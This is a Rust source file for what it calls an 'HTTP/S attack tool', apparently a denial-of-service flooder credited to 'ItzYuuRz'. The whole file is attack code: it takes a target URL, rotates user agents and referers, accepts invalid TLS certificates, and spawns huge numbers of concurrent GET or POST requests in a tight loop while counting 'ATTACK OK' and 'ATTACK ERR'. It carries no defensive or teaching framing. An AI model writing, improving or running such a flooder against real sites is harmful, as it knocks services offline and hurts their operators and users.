use clap::{Arg, ArgAction, Command};
use colored::Colorize;
use futures::stream::StreamExt;
use reqwest::{Client, ClientBuilder};
use ruinable::*;
use signal_hook::consts::{SIGINT, SIGTERM};
use signal_hook_tokio::Signals;
use std::fs::File;
use std::io::{self, Read, Write};
use std::path::Path;
use std::sync::atomic::{AtomicI32, AtomicI64, AtomicUsize, Ordering};
use std::sync::Arc;
use tokio::sync::mpsc;
use url::Url;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let matches = Command::new("TLS")
        .version(VERSION)
        .about("HTTP/S attack tool")
        .arg(
            Arg::new("version")
                .short('v')
                .long("version")
                .help("Print version and exit")
                .action(ArgAction::SetTrue),
        )
        .arg(
            Arg::new("safe")
                .long("safe")
                .help("Autoshut after dos")
                .action(ArgAction::SetTrue),
        )
        .arg(
            Arg::new("site")
                .long("site")
                .help("Destination site")
                .default_value("http://localhost"),
        )
        .arg(
            Arg::new("agents")
                .long("agents")
                .help("Get the list of user-agent lines from a file. By default the predefined list of useragents used"),
        )
        .arg(
            Arg::new("data")
                .long("data")
                .help("Data to POST. If present TLS will use POST requests instead of GET"),
        )
        .arg(
            Arg::new("header")
                .long("header")
                .help("Add headers to the request. Could be used multiple times")
                .action(ArgAction::Append),
        )
        .get_matches();

    if matches.get_flag("version") {
        println!("TLS {}", VERSION);
        return Ok(());
    }

    let safe = matches.get_flag("safe");
    let site = matches.get_one::<String>("site").unwrap();
    let agents = matches.get_one::<String>("agents");
    let data = matches.get_one::<String>("data").map(String::as_str);
    let headers: Vec<&str> = matches
        .get_many::<String>("header")
        .map(|vals| vals.map(|v| v.as_str()).collect())
        .unwrap_or_default();

    // Parse the URL
    let url_obj = Url::parse(site).map_err(|_| {
        eprintln!("err parsing url parameter");
        std::process::exit(1);
    })?;
    
    let host = url_obj.host_str().unwrap_or("localhost").to_string();

    // Get max processes
    let maxproc = std::env::var("TLSMAXPROCS")
        .map(|v| v.parse::<i64>().unwrap_or(17266166315252i64))
        .unwrap_or(17266166315252i64);

    // Set up user agents and referers
    let def_conf = DefaultConf::new();
    let mut headers_useragents = def_conf.default_useragents();
    let headers_referers = def_conf.default_referers();   

    // Load user agents from file if specified
    if let Some(agents_file) = agents {
        if let Ok(content) = read_file_to_string(agents_file) {
            headers_useragents = content
                .lines()
                .filter(|line| !line.trim().is_empty())
                .map(|line| line.to_string())
                .collect::<Vec<String>>();
        } else {
            eprintln!("can't load User-Agent list from {}", agents_file);
            std::process::exit(1);
        }
    }

    // Print ASCII art banner
    print_banner();

    // Set up shared counters
    let cur = Arc::new(AtomicI32::new(0));
    let maxproc_arc = Arc::new(AtomicI64::new(maxproc));
    let err_count = Arc::new(AtomicUsize::new(0));
    let sent_count = Arc::new(AtomicUsize::new(0));

    // Set up channel for status messages
    let (tx, mut rx) = mpsc::channel::<CallStatus>(1000);

    // Handle signals
    let mut signals = Signals::new(&[SIGINT, SIGTERM])?;
    let _signals_handle = signals.handle();

    // Clone shared state for the signal handler task
    let _signals_task = tokio::spawn(async move {
        while let Some(signal) = signals.next().await {
            match signal {
                SIGINT | SIGTERM => {
                    println!("\r\n-- Interrupted by user -- TLS     \n");
                    std::process::exit(0);
                }
                _ => {}
            }
        }
    });

    // Shared state for the HTTP client
    let client = Arc::new(create_client());
    let headers_useragents = Arc::new(headers_useragents);
    let headers_referers = Arc::new(headers_referers);
    let site = Arc::new(site.to_string());
    let host = Arc::new(host);
    let headers_vec = Arc::new(headers.into_iter().map(String::from).collect::<Vec<String>>());
    
    // Task to display status
    let _status_display_task = {
        let cur = Arc::clone(&cur);
        let maxproc = Arc::clone(&maxproc_arc);
        let sent_count = Arc::clone(&sent_count);
        let err_count = Arc::clone(&err_count);
        
        tokio::spawn(async move {
            println!("{}", "In use               ║\t║\tATTACK OK ║\tATTACK ERR".red());
            let mut last_display = 0;
            
            loop {
                let current = sent_count.load(Ordering::Relaxed);
                if current % 10 == 0 && current != last_display {
                    print!("\r{:6} {:6} ║\t{:6} ║\t{:0}",
                        cur.load(Ordering::Relaxed),
                        maxproc.load(Ordering::Relaxed),
                        current,
                        err_count.load(Ordering::Relaxed)
                    );
                    io::stdout().flush().unwrap();
                    last_display = current;
                }
                
                tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
            }
        })
    };

    // Process status messages
    let _message_handler = tokio::spawn({
        let cur = Arc::clone(&cur);
        let maxproc = Arc::clone(&maxproc_arc);
        let safe = safe;
        let sent_count = Arc::clone(&sent_count);
        let err_count = Arc::clone(&err_count);

        async move {
            while let Some(status) = rx.recv().await {
                match status {
                    CallStatus::GotOk => {
                        sent_count.fetch_add(1, Ordering::Relaxed);
                    }
                    CallStatus::ExitOnErr => {
                        cur.fetch_sub(1, Ordering::Relaxed);
                        err_count.fetch_add(1, Ordering::Relaxed);
                    }
                    CallStatus::ExitOnTooManyFiles => {
                        cur.fetch_sub(1, Ordering::Relaxed);
                        maxproc.fetch_sub(1, Ordering::Relaxed);
                    }
                    CallStatus::TargetComplete => {
                        sent_count.fetch_add(1, Ordering::Relaxed);
                        println!(
                            "\r{:6} of max {:6} ║\t{:7} ║\t{:6}",
                            cur.load(Ordering::Relaxed),
                            maxproc.load(Ordering::Relaxed),
                            sent_count.load(Ordering::Relaxed),
                            err_count.load(Ordering::Relaxed)
                        );
                        println!("\r🚀TLS ATTACK FINISHED🚀     \n\n\r");
                        std::process::exit(0);
                    }
                }
            }
        }
    });

    // Main attack loop
    loop {
        if (cur.load(Ordering::Relaxed) as i64) < maxproc_arc.load(Ordering::Relaxed) - 1 {
            let current_tx = tx.clone();
            let current_client = Arc::clone(&client);
            let current_site = Arc::clone(&site);
            let current_host = Arc::clone(&host);
            let current_headers_useragents = Arc::clone(&headers_useragents);
            let current_headers_referers = Arc::clone(&headers_referers);
            let current_headers = Arc::clone(&headers_vec);
            let data_clone = data.map(String::from);
            let safe_clone = safe;

            cur.fetch_add(1, Ordering::Relaxed);

            tokio::spawn(async move {
                httpcall(
                    current_client,
                    current_site.as_str(),
                    current_host.as_str(),
                    data_clone.as_deref(),
                    &current_headers,
                    current_tx,
                    &current_headers_useragents,
                    &current_headers_referers,
                    safe_clone,
                ).await;
            });
        }

        tokio::time::sleep(tokio::time::Duration::from_millis(1)).await;
    }

    // Clean up (this part is technically unreachable)
    _signals_handle.close();
    _signals_task.await?;
    _status_display_task.abort();
    _message_handler.abort();

    Ok(())
}

// O(1) operation to create HTTP client
fn create_client() -> Client {
    ClientBuilder::new()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .use_rustls_tls()
        .build()
        .unwrap_or_else(|_| {
            eprintln!("Failed to create HTTP client");
            std::process::exit(1);
        })
}

// O(1) operation to print banner
fn print_banner() {
    println!("By: ItzYuuRz(please don't change this credits)");
}

// O(n) operation where n is the file size
fn read_file_to_string<P: AsRef<Path>>(path: P) -> io::Result<String> {
    let mut file = File::open(path)?;
    // Pre-allocate buffer if we can determine the file size
    let mut content = if let Ok(metadata) = file.metadata() {
        String::with_capacity(metadata.len() as usize)
    } else {
        String::new()
    };
    file.read_to_string(&mut content)?;
    Ok(content)
}
